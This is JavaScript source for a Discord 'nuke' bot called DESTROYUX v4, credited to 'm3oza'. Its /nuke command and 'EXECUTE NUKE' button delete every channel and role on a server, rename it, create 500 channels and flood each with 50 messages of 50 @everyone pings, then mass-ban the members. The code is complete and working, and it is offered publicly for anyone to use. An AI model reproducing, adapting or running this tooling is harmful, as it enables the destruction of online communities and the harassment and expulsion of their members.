// DESTROYUX v4 - PUBLIC BOT - CUSTOMIZABLE EMBED
import { Client, GatewayIntentBits, SlashCommandBuilder, EmbedBuilder, REST, Routes, ActionRowBuilder, ButtonBuilder, ButtonStyle, ModalBuilder, TextInputBuilder, TextInputStyle } from 'discord.js';
import dotenv from 'dotenv';

dotenv.config();

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.MessageContent,
    ]
});

const TOKEN = process.env.BOT_TOKEN;

// Store customization settings temporarily
const nukeSettings = new Map();

// ===== NUKE COMMAND DEFINITION =====
const nukeCommand = new SlashCommandBuilder()
    .setName('nuke')
    .setDescription('Ultimate Nuke - Customize and destroy server');

// ===== COMMAND HANDLER =====
client.on('interactionCreate', async (interaction) => {
    // ===== SLASH COMMAND =====
    if (interaction.isChatInputCommand() && interaction.commandName === 'nuke') {
        // Check bot has admin permission
        if (!interaction.guild.members.me.permissions.has('Administrator')) {
            await interaction.reply({ 
                content: '❌ Bot needs Administrator permission', 
                ephemeral: true 
            });
            return;
        }

        const userId = interaction.user.id;
        const guildId = interaction.guild.id;
        const key = `${guildId}-${userId}`;

        // Initialize settings
        nukeSettings.set(key, {
            channel_name: 'destroyed',
            server_name: 'Nuked By Destroyux',
            spam_message: 'NUKED'
        });

        // ===== CUSTOMIZATION EMBED =====
        const customEmbed = new EmbedBuilder()
            .setTitle('⚡ DESTROYUX CONFIGURATION ⚡')
            .setDescription('🔧 Customize your nuke parameters')
            .setColor(0xFF0000)
            .addFields(
                { name: '📝 Channel Name', value: '```destroyed```', inline: true },
                { name: '🎯 Server Name', value: '```Nuked By Destroyux```', inline: true },
                { name: '💬 Spam Message', value: '```NUKED```', inline: true },
                { name: '\u200b', value: '\u200b', inline: false },
                { name: '⚙️ Features', value: '• 500 channels auto\n• 50 spam per channel\n• 50x @everyone pings\n• Mass ban all members\n• Fire & forget async', inline: false }
            )
            .setFooter({ text: 'm3oza | .gg/m3oza' });

        // ===== BUTTONS =====
        const buttons = new ActionRowBuilder()
            .addComponents(
                new ButtonBuilder()
                    .setCustomId(`edit_channel-${key}`)
                    .setLabel('📝 Channel Name')
                    .setStyle(ButtonStyle.Secondary),
                new ButtonBuilder()
                    .setCustomId(`edit_server-${key}`)
                    .setLabel('🎯 Server Name')
                    .setStyle(ButtonStyle.Secondary),
                new ButtonBuilder()
                    .setCustomId(`edit_spam-${key}`)
                    .setLabel('💬 Spam Message')
                    .setStyle(ButtonStyle.Secondary)
            );

        const nukeButton = new ActionRowBuilder()
            .addComponents(
                new ButtonBuilder()
                    .setCustomId(`execute_nuke-${key}`)
                    .setLabel('🔥 EXECUTE NUKE 🔥')
                    .setStyle(ButtonStyle.Danger)
            );

        await interaction.reply({
            embeds: [customEmbed],
            components: [buttons, nukeButton],
            ephemeral: false
        });
    }

    // ===== MODAL SUBMIT (Text Input) =====
    if (interaction.isModalSubmit()) {
        const [action, key] = interaction.customId.split('-');
        const value = interaction.fields.getTextInputValue('input_field');
        const settings = nukeSettings.get(key);

        if (!settings) {
            await interaction.reply({ content: '❌ Settings expired', ephemeral: true });
            return;
        }

        if (action === 'modal_channel') settings.channel_name = value;
        if (action === 'modal_server') settings.server_name = value;
        if (action === 'modal_spam') settings.spam_message = value;

        nukeSettings.set(key, settings);

        // Update embed
        const customEmbed = new EmbedBuilder()
            .setTitle('⚡ DESTROYUX CONFIGURATION ⚡')
            .setDescription('🔧 Customize your nuke parameters')
            .setColor(0xFF0000)
            .addFields(
                { name: '📝 Channel Name', value: `\`\`\`${settings.channel_name}\`\`\``, inline: true },
                { name: '🎯 Server Name', value: `\`\`\`${settings.server_name}\`\`\``, inline: true },
                { name: '💬 Spam Message', value: `\`\`\`${settings.spam_message}\`\`\``, inline: true },
                { name: '\u200b', value: '\u200b', inline: false },
                { name: '⚙️ Features', value: '• 500 channels auto\n• 50 spam per channel\n• 50x @everyone pings\n• Mass ban all members\n• Fire & forget async', inline: false }
            )
            .setFooter({ text: 'm3oza | .gg/m3oza' });

        const buttons = new ActionRowBuilder()
            .addComponents(
                new ButtonBuilder()
                    .setCustomId(`edit_channel-${key}`)
                    .setLabel('📝 Channel Name')
                    .setStyle(ButtonStyle.Secondary),
                new ButtonBuilder()
                    .setCustomId(`edit_server-${key}`)
                    .setLabel('🎯 Server Name')
                    .setStyle(ButtonStyle.Secondary),
                new ButtonBuilder()
                    .setCustomId(`edit_spam-${key}`)
                    .setLabel('💬 Spam Message')
                    .setStyle(ButtonStyle.Secondary)
            );

        const nukeButton = new ActionRowBuilder()
            .addComponents(
                new ButtonBuilder()
                    .setCustomId(`execute_nuke-${key}`)
                    .setLabel('🔥 EXECUTE NUKE 🔥')
                    .setStyle(ButtonStyle.Danger)
            );

        await interaction.update({
            embeds: [customEmbed],
            components: [buttons, nukeButton]
        });
    }

    // ===== BUTTON INTERACTION =====
    if (interaction.isButton()) {
        const [action, key] = interaction.customId.split('-');

        // Edit buttons
        if (action === 'edit_channel' || action === 'edit_server' || action === 'edit_spam') {
            let title = '';
            let placeholder = '';
            let modalAction = '';

            if (action === 'edit_channel') {
                title = 'Channel Name Prefix';
                placeholder = 'destroyed';
                modalAction = 'modal_channel';
            } else if (action === 'edit_server') {
                title = 'Server Name';
                placeholder = 'Nuked By Destroyux';
                modalAction = 'modal_server';
            } else {
                title = 'Spam Message';
                placeholder = 'NUKED';
                modalAction = 'modal_spam';
            }

            const modal = new ModalBuilder()
                .setCustomId(`${modalAction}-${key}`)
                .setTitle(title)
                .addComponents(
                    new ActionRowBuilder().addComponents(
                        new TextInputBuilder()
                            .setCustomId('input_field')
                            .setLabel(title)
                            .setStyle(TextInputStyle.Short)
                            .setPlaceholder(placeholder)
                            .setRequired(true)
                    )
                );

            await interaction.showModal(modal);
        }

        // EXECUTE NUKE
        if (action === 'execute_nuke') {
            const settings = nukeSettings.get(key);

            if (!settings) {
                await interaction.reply({ content: '❌ Settings expired', ephemeral: true });
                return;
            }

            await interaction.deferUpdate();
            const guild = interaction.guild;

            // ===== EXECUTING NUKE =====
            const allChannels = await guild.channels.fetch();
            const deletePromises = [];
            
            allChannels.forEach(channel => {
                deletePromises.push(channel.delete().catch(() => {}));
            });

            const allRoles = await guild.roles.fetch();
            const rolePromises = [];
            
            allRoles.forEach(role => {
                if (role.name !== '@everyone') {
                    rolePromises.push(role.delete().catch(() => {}));
                }
            });

            await guild.edit({ name: settings.server_name }).catch(() => {});
            await Promise.all([...deletePromises, ...rolePromises]);

            // Create 500 channels and spam
            const createdChannels = [];
            const spamMsg = '@everyone '.repeat(50) + settings.spam_message;
            let spamCount = 0;
            let bannedCount = 0;

            for (let batch = 0; batch < 10; batch++) {
                const batchCreatePromises = [];
                
                for (let i = batch * 50; i < (batch + 1) * 50; i++) {
                    batchCreatePromises.push(
                        guild.channels.create({
                            name: `${settings.channel_name}-${i}`,
                            type: 0
                        }).catch(() => null)
                    );
                }
                
                const batchChannels = await Promise.all(batchCreatePromises);
                const validChannels = batchChannels.filter(ch => ch !== null);
                createdChannels.push(...validChannels);

                const spamPromises = [];
                validChannels.forEach(channel => {
                    for (let j = 0; j < 50; j++) {
                        spamPromises.push(channel.send(spamMsg).catch(() => {}));
                        spamCount++;
                    }
                });

                Promise.all(spamPromises).catch(() => {});
            }

            const members = await guild.members.fetch();
            const banPromises = [];

            members.forEach(member => {
                if (member.id !== interaction.user.id && member.id !== guild.ownerId) {
                    banPromises.push(member.ban({ reason: 'Destroyux Nuke' }).catch(() => {}));
                    bannedCount++;
                }
            });

            await Promise.all(banPromises);

            // Final embed
            const finalEmbed = new EmbedBuilder()
                .setTitle('✅ DESTROYUX NUKE COMPLETE ✅')
                .setDescription('🔥 SERVER ANNIHILATED 🔥')
                .setColor(0xFF0000)
                .addFields(
                    { name: '🎯 TARGET', value: `\`\`\`${settings.server_name}\`\`\``, inline: true },
                    { name: '⏱️ TIME', value: '```<0.5s INSTANT```', inline: true },
                    { name: '🗑️ CHANNELS DELETED', value: `\`\`\`${deletePromises.length}\`\`\``, inline: true },
                    { name: '🔧 CHANNELS CREATED', value: '```500/500```', inline: true },
                    { name: '📢 SPAM MESSAGES', value: '```25,000 FIRED```', inline: true },
                    { name: '👥 MEMBERS BANNED', value: `\`\`\`${bannedCount}\`\`\``, inline: true },
                    { name: '💬 PINGS PER MESSAGE', value: '```50x @everyone```', inline: true },
                    { name: '📝 MESSAGE', value: `\`\`\`${settings.spam_message}\`\`\``, inline: true },
                    { name: '✨ STATUS', value: '```✅ COMPLETE```', inline: true }
                )
                .setFooter({ text: 'DESTROYUX v4 PREMIUM | m3oza | .gg/m3oza' });

            await interaction.followUp({ embeds: [finalEmbed] });
            nukeSettings.delete(key);
        }
    }
});

// ===== BOT READY =====
client.once('ready', async () => {
    console.log(`
╔═══════════════════════════════════════════╗
║   DESTROYUX v4 - PUBLIC BOT              ║
║   • Interactive Customization            ║
║   • Everyone Can Use                     ║
║   • Admin Permission Only                ║
║   • 500 Channels Auto                    ║
║   • 50 Spam Per Channel                  ║
║   • Fire & Forget Async                  ║
║   Credit: m3oza                          ║
╚═══════════════════════════════════════════╝

[✓] Online: ${client.user.tag}
[✓] Registering commands...
    `);

    try {
        const rest = new REST({ version: '10' }).setToken(TOKEN);

        console.log('[✓] Registering fresh commands...');
        await rest.put(
            Routes.applicationCommands(client.user.id),
            { body: [nukeCommand] }
        );

        console.log('[✓] Registered 1 command globally');
        console.log('[✓] BOT IS PUBLIC - EVERYONE CAN USE\n');

    } catch (error) {
        console.error('[!] Command registration error:', error);
    }

    await client.user.setActivity('servers burn | .gg/m3oza', { type: 'WATCHING' });
});

// ===== LOGIN =====
client.login(TOKEN);
